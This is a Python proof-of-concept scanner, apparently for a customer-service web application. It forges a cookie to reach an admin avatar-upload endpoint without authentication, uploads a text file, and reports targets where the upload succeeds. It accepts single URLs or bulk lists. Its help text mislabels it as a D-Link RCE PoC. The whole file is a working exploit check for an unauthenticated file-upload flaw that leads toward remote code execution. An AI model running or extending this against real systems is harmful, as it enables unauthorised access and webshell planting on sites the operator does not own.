import argparse
import sys
import requests
import urllib3
import json

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

banner = """

ooooo                              oooo                   .o88o.             
`888'                              `888                   888 `"             
 888          .oooo.   oooo    ooo  888  oooo   .ooooo.  o888oo  oooo  oooo  
 888         `P  )88b   `88.  .8'   888 .8P'   d88' `88b  888    `888  `888  
 888          .oP"888    `88..8'    888888.    888ooo888  888     888   888  
 888       o d8(  888     `888'     888 `88b.  888    .o  888     888   888  
o888ooooood8 `Y888""8o     .8'     o888o o888o `Y8bod8P' o888o    `V88V"V8P' 
                       .o..P'                                                
                       `Y8P'                                                 
                                                                             
                               oooo                            .o8  
                               `888                           "888  
        oooo  oooo  oo.ooooo.   888   .ooooo.   .oooo.    .oooo888  
        `888  `888   888' `88b  888  d88' `88b `P  )88b  d88' `888  
8888888  888   888   888   888  888  888   888  .oP"888  888   888  
         888   888   888   888  888  888   888 d8(  888  888   888  
         `V88V"V8P'  888bod8P' o888o `Y8bod8P' `Y888""8o `Y8bod88P" 
                     888                                            
                    o888o  
                                                                       by 椿生
"""
print(banner)
def poc(target):
    url = target + "/admin/users/upavatar.html"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 Edg/107.0.1418.26",
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "X-Requested-With": "XMLHttpRequest",
        "Origin": "http://xxx.xxx.xxx",
        "Referer": "http://xxx.xxx.xxx/admin/users/edituser/id/1.html",
        "Cookie": "user_name=1; user_id=3",
        "Accept-Encoding": "gzip, deflate",
        "sec-ch-ua-platform": "Windows",
        "sec-ch-ua-mobile": "?0"
    }

    files = {
        "file": ("readme.txt", "just readme"),
    }

    try:
        r = requests.post(url, headers=headers, files=files, verify=False)  # Set verify to True if using SSL/TLS
        r.raise_for_status()  # Raise an exception if the request was unsuccessful

       
        res = r.json()['data']['src']
        
        if ".txt" in res:
            print(f"[+] {target}存在漏洞!{target+res}")
        else:
            print("[-] Vulnerability not found.")
    except requests.exceptions.RequestException as e:
        print("Request error:", e)
    except (KeyError, ValueError) as e:
        print("Response parsing error:", e)
    except Exception as e:
        print("Error:", e)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="D-link-rce POC")
    parser.add_argument("-u", "--url", dest="target_url", help="Target URL")
    parser.add_argument("-f", "--file", dest="file_path", help="File containing target URLs")
    args = parser.parse_args()

    if not args.target_url and not args.file_path:
        parser.print_help()
        sys.exit(1)

    if args.target_url:
        poc(args.target_url)

    if args.file_path:
        with open(args.file_path, "r") as file:
            for line in file:
                target_url = line.strip()
                poc(target_url)